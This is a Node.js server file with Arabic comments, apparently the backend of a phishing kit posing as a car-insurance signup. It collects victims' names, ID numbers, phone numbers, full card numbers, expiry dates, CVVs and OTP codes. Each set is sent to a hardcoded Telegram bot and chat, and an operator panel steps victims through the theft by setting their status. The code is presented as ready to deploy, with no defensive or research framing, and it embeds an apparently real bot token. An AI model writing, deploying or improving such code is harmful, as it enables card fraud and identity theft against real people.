const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const fs = require('fs');
const path = require('path');
const cors = require('cors'); // لتثبيت cors: npm install cors

const app = express();
const server = http.createServer(app);

// --- إعدادات Telegram (يجب استخدام متغيرات البيئة في الإنتاج) ---
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7647127310:AAEL_VzCr1wTh26Exczu6IPqEsH4HHHVE'; // استبدل بقيمتك الحقيقية
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '6454807559'; // استبدل بقيمتك الحقيقية
// هام: يجب عليك ضبط هذه المتغيرات في إعدادات مشروع Vercel الخاص بك.

/**
 * دالة لإرسال رسالة إلى Telegram
 * @param {string} message الرسالة المراد إرسالها
 * @returns {Promise<boolean>} True إذا تم الإرسال بنجاح، False بخلاف ذلك
 */
async function sendTelegramMessage(message) {
    // التحقق من وجود التوكن ومعرف الشات لتجنب الأخطاء
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error("Telegram BOT_TOKEN or CHAT_ID is not set. Cannot send message.");
        return false;
    }

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const data = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });

        const result = await response.json();
        if (response.ok && result.ok) {
            console.log("Message sent to Telegram successfully.");
            return true;
        } else {
            console.error("Telegram API Error:", result.description || 'Unknown error', result);
            return false;
        }
    } catch (error) {
        console.error("Failed to send message to Telegram:", error);
        return false;
    }
}

// --- إعدادات CORS ديناميكية لبيئة التطوير والإنتاج ---
// في الإنتاج، استبدل 'https://your-vercel-app-domain.vercel.app' بنطاق تطبيقك الفعلي على Vercel
// على سبيل المثال: 'https://my-insurance-app.vercel.app'
const allowedOrigins = process.env.NODE_ENV === 'production'
    ? 'https://your-vercel-app-domain.vercel.app' // <<<<< غيّر هذا النطاق الفعلي
    : 'http://localhost:3000'; // لبيئة التطوير المحلية

// تهيئة Socket.IO مع CORS
const io = socketIo(server, {
    cors: {
        origin: allowedOrigins,
        methods: ["GET", "POST"]
    }
});

// مسار ملف البيانات JSON
// Vercel تعامل نظام الملفات على أنه Read-Only بعد النشر.
// أي كتابة ستكون مؤقتة وستختفي عند إعادة نشر التطبيق أو إعادة تشغيل الخادم.
const DATA_FILE = path.join(__dirname, 'form_submissions.json');

// التأكد من وجود ملف البيانات عند بدء تشغيل الخادم
// هذا سيخلق الملف إذا لم يكن موجوداً.
// في بيئة Vercel، هذا الملف سيتم إنشاؤه في نظام ملفات مؤقت لكل "instance" من التطبيق.
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, '[]', 'utf8');
    console.log('Created empty form_submissions.json file.');
}

// تهيئة CORS لطلبات HTTP العادية
app.use(cors({
    origin: allowedOrigins,
    methods: ["GET", "POST"]
}));

// تمكين Express من قراءة JSON و URL-encoded bodies
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// لخدمة الملفات الثابتة (مثل index.html, CSS, JS) من مجلد public
// تأكد من أن مجلد 'public' موجود في جذر مشروعك وأن جميع الملفات الثابتة بداخله.
app.use(express.static(path.join(__dirname, 'public')));

// دالة لقراءة البيانات
function readSubmissions() {
    try {
        // قراءة الملف بشكل متزامن.
        // في تطبيقات الإنتاج، خاصةً مع الملفات الكبيرة، يُفضل استخدام الطرق غير المتزامنة (readFile) لتجنب حظر الـ Event Loop.
        const data = fs.readFileSync(DATA_FILE, 'utf8');
        const submissions = JSON.parse(data);
        if (submissions === null || !Array.isArray(submissions)) {
            console.error("Error decoding form_submissions.json. File might be corrupted or not an array. Returning empty array.");
            return [];
        }
        return submissions;
    } catch (error) {
        console.error('Error reading data file. Returning empty array:', error);
        // إذا كان الملف غير موجود أو تالف، ابدأ بملف فارغ لضمان عمل التطبيق
        if (error.code === 'ENOENT') {
            fs.writeFileSync(DATA_FILE, '[]', 'utf8');
            console.log('Re-created empty form_submissions.json due to missing file.');
        }
        return [];
    }
}

// دالة لكتابة البيانات
function writeSubmissions(submissions) {
    try {
        // كتابة الملف بشكل متزامن.
        // يُفضل استخدام الطرق غير المتزامنة (writeFile) في الإنتاج.
        fs.writeFileSync(DATA_FILE, JSON.stringify(submissions, null, 2), 'utf8');
        io.emit('data_updated', { data: submissions }); // بث التحديثات لجميع العملاء المتصلين
        console.log('Data saved and broadcasted via Socket.IO.');
    } catch (error) {
        console.error('Error writing data file:', error);
    }
}

// ===============================================
// نقطة نهاية واحدة لجميع عمليات النموذج
// ===============================================
app.post('/process_form_data', async (req, res) => {
    const formData = req.body;
    const action = formData.action;
    let submissions = readSubmissions(); // قراءة البيانات الحالية
    let response = { status: 'error', message: 'طلب غير صالح.' };
    let id_number;

    switch (action) {
        case 'submit_initial_form':
            if (!formData.owner_name || !formData.id_number || !formData.phone) {
                response = { status: 'error', message: 'يرجى ملء الاسم، رقم الهوية، ورقم الهاتف.' };
                break;
            }

            id_number = formData.id_number;
            let foundIndex = submissions.findIndex(s => s.id_number === id_number);

            const new_submission_data = {
                owner_name: formData.owner_name,
                id_number: id_number,
                phone: formData.phone,
                purpose: formData.purpose || 'new_insurance',
                serial_number_form: formData.serial_number_form || '',
                manufacture_year: formData.manufacture_year || '',
                serial_number_custom: formData.serial_number_custom || '',
                status: 'pending',
                submission_timestamp: new Date().toISOString(),
                geo_info: formData.geo_info || null,
                browser_info: formData.browser_info || null
            };

            let action_message;
            let telegram_prefix;

            if (foundIndex !== -1) {
                submissions[foundIndex] = { ...submissions[foundIndex], ...new_submission_data };
                action_message = 'تم تحديث بياناتك بنجاح.';
                telegram_prefix = `<b>تحديث بيانات عميل:</b> ${new_submission_data.owner_name || 'غير معروف'}\n\n`;
            } else {
                submissions.push(new_submission_data);
                action_message = 'تم استلام بياناتك بنجاح.';
                telegram_prefix = `<b>طلب جديد من عميل:</b> ${new_submission_data.owner_name || 'غير معروف'}\n\n`;
            }

            writeSubmissions(submissions); // حفظ البيانات وإرسالها عبر Socket.IO

            response = { status: 'success', message: action_message };

            const telegram_message_initial = telegram_prefix +
                `<b>الاسم:</b> ${new_submission_data.owner_name || 'غير متوفر'}\n` +
                `<b>رقم الهوية:</b> ${new_submission_data.id_number || 'غير متوفر'}\n` +
                `<b>الهاتف:</b> ${new_submission_data.phone || 'غير متوفر'}\n` +
                `<b>الغرض:</b> ${new_submission_data.purpose || 'غير متوفر'}\n` +
                `<b>تاريخ الإرسال:</b> ${new_submission_data.submission_timestamp || 'غير متوفر'}` +
                (new_submission_data.serial_number_form ? `\n<b>الرقم التسلسلي (استمارة):</b> ${new_submission_data.serial_number_form}` : '') +
                (new_submission_data.manufacture_year ? `\n<b>سنة الصنع:</b> ${new_submission_data.manufacture_year}` : '') +
                (new_submission_data.serial_number_custom ? `\n<b>الرقم التسلسلي (جمركية):</b> ${new_submission_data.serial_number_custom}` : '');

            await sendTelegramMessage(telegram_message_initial);
            break;

        case 'insurance_details':
            if (!formData.id_number) {
                response = { status: 'error', message: 'رقم الهوية مطلوب لحفظ تفاصيل التأمين.' };
                break;
            }
            id_number = formData.id_number;
            let currentSubmissionForInsurance = submissions.find(s => s.id_number === id_number);

            if (currentSubmissionForInsurance) {
                currentSubmissionForInsurance.insurance_details = {
                    insurance_type: formData.insurance_type || '',
                    start_date: formData.start_date || '',
                    usage_purpose: formData.usage_purpose || '',
                    car_value: formData.car_value || '',
                    manufacture_year: formData.manufacture_year || '',
                    repair_location: formData.repair_location || '',
                    timestamp: new Date().toISOString()
                };
                writeSubmissions(submissions);
                response = { status: 'success', message: 'تم حفظ تفاصيل التأمين بنجاح.' };
            } else {
                response = { status: 'error', message: 'رقم الهوية غير موجود لحفظ تفاصيل التأمين.' };
            }
            break;

        case 'save_payment_details':
            if (!formData.id_number) {
                response = { status: 'error', message: 'رقم الهوية مطلوب لحفظ تفاصيل الدفع.' };
                break;
            }
            id_number = formData.id_number;
            let currentSubmissionForPayment = submissions.find(s => s.id_number === id_number);

            if (currentSubmissionForPayment) {
                currentSubmissionForPayment.payment_details = {
                    payment_method: formData.payment_method || '',
                    total_amount: formData.total_amount || '',
                    timestamp: new Date().toISOString()
                };
                writeSubmissions(submissions);
                response = { status: 'success', message: 'تم حفظ تفاصيل الدفع بنجاح.' };
            } else {
                response = { status: 'error', message: 'رقم الهوية غير موجود لحفظ تفاصيل الدفع.' };
            }
            break;

        case 'save_card_details':
            if (!formData.id_number) {
                response = { status: 'error', message: 'رقم الهوية مطلوب لحفظ تفاصيل البطاقة.' };
                break;
            }
            id_number = formData.id_number;
            let userUpdated = false;
            let currentSubmissionForCard;

            submissions = submissions.map(s => {
                if (s.id_number === id_number) {
                    currentSubmissionForCard = s;
                    s.card_details = {
                        card_name: formData.card_name || '',
                        card_number: formData.card_number || '',
                        expiry_date: formData.expiry_date || '',
                        cvv: formData.cvv || '',
                        timestamp: new Date().toISOString()
                    };
                    s.status = 'pending';
                    userUpdated = true;
                }
                return s;
            });

            if (userUpdated) {
                writeSubmissions(submissions);
                response = { status: 'success', message: 'تم حفظ تفاصيل البطاقة بنجاح.' };

                if (currentSubmissionForCard) {
                    const telegram_message_card = `<b>🔴 تم تعبئة بيانات بطاقة لعميل:</b> ${currentSubmissionForCard.owner_name || 'غير معروف'}\n\n` +
                        `<b>رقم الهوية:</b> ${id_number || 'غير متوفر'}\n` +
                        `<b>رقم البطاقة:</b> ${formData.card_number || 'غير متوفر'}\n` +
                        `<b>تاريخ الانتهاء:</b> ${formData.expiry_date || 'غير متوفر'}\n` +
                        `<b>CVV:</b> ${formData.cvv || 'غير متوفر'}\n` +
                        `<b>وقت الإرسال:</b> ${currentSubmissionForCard.card_details.timestamp || 'غير متوفر'}`;
                    await sendTelegramMessage(telegram_message_card);
                }

            } else {
                response = { status: 'error', message: 'رقم الهوية غير موجود لحفظ تفاصيل البطاقة.' };
            }
            break;

        case 'save_otp':
            if (!formData.id_number || !formData.otp_code) {
                response = { status: 'error', message: 'رقم الهوية ورمز OTP مطلوبان لحفظ OTP.' };
                break;
            }
            id_number = formData.id_number;
            const otp_code = formData.otp_code;
            let userUpdatedOtp = false;
            let currentSubmissionForOtp;

            submissions = submissions.map(s => {
                if (s.id_number === id_number) {
                    currentSubmissionForOtp = s;
                    if (!s.otp_attempts || !Array.isArray(s.otp_attempts)) {
                        s.otp_attempts = [];
                    }
                    s.otp_attempts.push({
                        otp_code: otp_code,
                        timestamp: new Date().toISOString()
                    });
                    userUpdatedOtp = true;
                }
                return s;
            });

            if (userUpdatedOtp) {
                writeSubmissions(submissions);
                response = { status: 'success', message: 'تم حفظ رمز OTP بنجاح.' };

                if (currentSubmissionForOtp) {
                    const latestOtpAttempt = currentSubmissionForOtp.otp_attempts[currentSubmissionForOtp.otp_attempts.length - 1];
                    const telegram_message_otp = `<b>🚨 تم إدخال رمز OTP لعميل:</b> ${currentSubmissionForOtp.owner_name || 'غير معروف'}\n\n` +
                        `<b>رقم الهوية:</b> ${id_number || 'غير متوفر'}\n` +
                        `<b>رمز OTP:</b> ${latestOtpAttempt.otp_code || 'غير متوفر'}\n` +
                        `<b>وقت الإدخال:</b> ${latestOtpAttempt.timestamp || 'غير متوفر'}`;
                    await sendTelegramMessage(telegram_message_otp);
                }

            } else {
                response = { status: 'error', message: 'رقم الهوية غير موجود لحفظ رمز OTP.' };
            }
            break;

        case 'update_status':
            if (!formData.id_number || !formData.status) {
                response = { status: 'error', message: 'رقم الهوية والحالة مطلوبان للتحديث.' };
                break;
            }
            id_number = formData.id_number;
            const new_status = formData.status;
            let updated = false;
            let submissionForStatusUpdate;
            submissions = submissions.map(s => {
                if (s.id_number === id_number) {
                    submissionForStatusUpdate = s;
                    s.status = new_status;
                    updated = true;
                }
                return s;
            });

            if (updated) {
                writeSubmissions(submissions);
                response = { status: 'success', message: 'تم تحديث حالة المستخدم بنجاح.' };
            } else {
                response = { status: 'error', message: 'المستخدم غير موجود.' };
            }
            break;

        case 'check_status':
            if (!formData.id_number) {
                response = { status: 'error', message: 'رقم الهوية مطلوب للتحقق من الحالة.' };
                break;
            }
            id_number = formData.id_number;
            let user_status = 'pending';
            const foundSubmission = submissions.find(s => s.id_number === id_number);
            if (foundSubmission) {
                user_status = foundSubmission.status || 'pending';
            }
            response = { status: user_status };
            break;

        default:
            response = { status: 'error', message: 'الإجراء المطلوب غير صالح.' };
            break;
    }

    res.json(response);
});

// --- مراقبة تغييرات ملف JSON (لن تعمل بشكل موثوق على Vercel) ---
// يُنصح بإزالة هذا الجزء تمامًا إذا كنت تستخدم قاعدة بيانات خارجية.
// في بيئة Vercel، لا يُنصح بالاعتماد على fs.watch لأن نظام الملفات مؤقت وغير متزامن عبر "instances".
fs.watch(DATA_FILE, (eventType, filename) => {
    if (eventType === 'change') {
        console.log(`File ${filename} has been changed. Reloading data.`);
        const updatedData = readSubmissions();
        io.emit('data_updated', { data: updatedData });
    }
});

// التعامل مع اتصالات Socket.IO
io.on('connection', (socket) => {
    console.log('A user connected:', socket.id);
    socket.emit('initial_data', { data: readSubmissions() }); // إرسال البيانات الأولية عند الاتصال

    socket.on('disconnect', () => {
        console.log('User disconnected:', socket.id);
    });

    socket.on('update_status_via_socket', ({ id_number, status }) => {
        let submissions = readSubmissions();
        const index = submissions.findIndex(s => s.id_number === id_number);
        if (index !== -1) {
            submissions[index].status = status;
            writeSubmissions(submissions); // حفظ التغيير وبثه

            socket.emit('status_update_ack', { id_number, status, message: 'Status updated successfully via Socket.IO.' });

            // إرسال رسالة تيليجرام عند تحديث الحالة من لوحة المشرف
            const updatedSubmission = submissions[index];
            const telegram_message_status = `<b>✅ تم تحديث حالة العميل:</b> ${updatedSubmission.owner_name || 'غير معروف'}\n` +
                `<b>رقم الهوية:</b> ${id_number}\n` +
                `<b>الحالة الجديدة:</b> ${status}`;
            sendTelegramMessage(telegram_message_status);

        } else {
            socket.emit('status_update_error', { id_number, message: 'Submission not found.' });
        }
    });
});

// --- تحديد المنفذ ---
// Vercel ستوفر متغير بيئة PORT. إذا لم يكن موجوداً، استخدم 3000 افتراضياً.
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Node.js server listening on port ${PORT}`);
    console.log(`Serving static files from: ${path.join(__dirname, 'public')}`);
    console.log(`Handling all form submissions and data operations via /process_form_data`);
});
